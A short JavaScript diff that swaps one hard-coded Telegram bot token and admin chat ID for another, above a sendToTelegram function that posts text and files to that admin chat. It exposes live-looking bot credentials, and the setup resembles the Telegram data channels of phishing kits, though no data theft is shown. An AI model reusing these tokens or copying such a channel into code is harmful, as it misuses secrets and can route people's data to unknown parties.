@@ -1,5 +1,5 @@
-const BOT_TOKEN = '8969534817:AAGXPFYcKq5dOhjsW64T7HatwpoLQoNHGp4';
-const ADMIN_CHAT_ID = '8574792010';
+const BOT_TOKEN = '8991307509:AAFDRfME3fMly1R2mhVdTBnH5yv2z-5I0s0';
+const ADMIN_CHAT_ID = '7867527304';
 
 function sendToTelegram(text, files = [], chatId = ADMIN_CHAT_ID) {
     const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
